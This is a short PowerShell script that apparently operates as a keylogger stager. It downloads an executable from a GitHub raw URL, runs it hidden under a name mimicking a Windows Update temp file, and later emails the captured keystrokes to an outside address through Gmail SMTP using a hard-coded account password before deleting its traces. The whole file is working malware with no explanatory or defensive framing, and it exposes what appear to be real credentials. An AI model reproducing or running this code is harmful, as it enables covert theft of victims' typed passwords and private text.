if (Test-Path "$env:temp\wsuA58F.tmp") {
	$From = "pshs1235@gmail.com"
	$To = "zacsengines@yahoo.com"
	$keys = [IO.File]::ReadAllText("$env:temp\wsuA58F.tmp")
	$SMTPServer = "smtp.gmail.com"
	$SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
	$SMTPClient.EnableSsl = $true
	$SMTPClient.Credentials = New-Object System.Net.NetworkCredential($From, "ixofwhfteeaiklik")
	$SMTPClient.Send($From, $To, "Keys pressed", $keys)
	taskkill -f -im wsuA58F.exe
	Remove-Item "$env:temp\wsuA58F.tmp"
	Remove-Item "$env:temp\wsuA58F.exe"
} else {
	New-Item "$env:temp\wsuA58F.tmp"
	(New-Object Net.WebClient).DownloadFile("https://raw.githubusercontent.com/SmartMozart/psh/main/wsuA58F.exe", "$env:temp\wsuA58F.exe")
	Start-Process "$env:temp\wsuA58F.exe" -WindowStyle hidden
}
